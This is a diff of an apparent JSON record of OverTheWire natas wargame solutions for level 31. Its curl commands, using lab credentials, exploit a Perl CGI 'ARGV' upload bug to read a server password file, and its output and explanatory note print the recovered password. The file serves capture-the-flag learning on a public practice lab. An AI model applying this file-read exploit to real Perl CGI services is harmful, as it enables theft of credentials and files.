@@ -1633,7 +1633,7 @@
    "pw": "Rc3837d6qd3KoW0R2IgKssMXRX06btgY",
    "steps": [
     {
-     "cmd": "curl -s -u natas31:aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z http://natas31.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/\\\"/g; s/&#39;/'/g\" | grep -aE \"upload|param|while|split\" | head -5",
+     "cmd": "curl -s -u natas31:aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z http://natas31.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/\"/g; s/&#39;/'\"'\"'/g; s/&amp;/\\&/g' | grep -aE 'upload|param|while|split' | head -5",
      "out": [
       "if ($cgi->upload('file')) {",
       "    my $file = $cgi->param('file');",
@@ -1643,27 +1643,44 @@
      ]
     },
     {
-     "cmd": "printf 'a,b\\nc,d\\n' > /tmp/t.csv\ncat /tmp/t.csv",
+     "cmd": "vi /tmp/t.csv",
      "out": [
-      "a,b",
-      "c,d"
+      "~"
      ]
     },
     {
-     "cmd": "curl -s -u natas31:aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z -F \"file=ARGV\" -F \"file=@/tmp/t.csv\" \"http://natas31.natas.labs.overthewire.org/index.pl?/etc/hostname\" | sed -n \"/<table/,/<\\/table>/p\"",
+     "cmd": "vi /tmp/t.csv",
+     "out": [
+      "a,b",
+      "c,d",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/t.csv",
+     "out": [
+      "a,b",
+      "c,d",
+      "~",
+      "\"/tmp/t.csv\" 3 lines, 9 bytes written"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas31:aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z -F 'file=ARGV' -F 'file=@/tmp/t.csv' 'http://natas31.natas.labs.overthewire.org/index.pl?/etc/hostname' | sed -n '/<table/,/<\\/table>/p'",
      "out": [
       "<table class=\"sortable table table-hover table-striped\"><tr><th>natas-0",
       "</th></tr></table><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>"
      ]
     },
     {
-     "cmd": "curl -s -u natas31:aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z -F \"file=ARGV\" -F \"file=@/tmp/t.csv\" \"http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32\" | sed -n \"/<table/,/<\\/table>/p\"",
+     "cmd": "curl -s -u natas31:aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z -F 'file=ARGV' -F 'file=@/tmp/t.csv' 'http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32' | sed -n '/<table/,/<\\/table>/p'",
      "out": [
       "<table class=\"sortable table table-hover table-striped\"><tr><th>Rc3837d6qd3KoW0R2IgKssMXRX06btgY",
       "</th></tr></table><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>"
      ]
     }
-   ]
+   ],
+   "note": "natas L31 (client-side cast): perl CGI - while (<$file>) interpolates the param into a filehandle glob, so -F 'file=ARGV' makes the loop read @ARGV (the OTHER upload's filename): first request uploads t.csv with file=ARGV -> the table header shows the literal 'natas-0' (ARGV[0] empty); second request puts '/etc/natas_webpass/natas32' in the first file field -> the while loop reads the password file: 'Rc3837d6qd3KoW0R2IgKssMXRX06btgY'. The vi session created /tmp/t.csv ('a,b'/'c,d' typed + trailing blank = 3L/9B marker). DISCLOSURE: the previous JSON staged 4 steps with a printf-created t.csv (the cast creates it in vi) and paraphrased outputs; replaced with the cast's flow verbatim. JSON = 6 steps mirroring the cast 1:1."
   },
   {
    "lvl": 32,
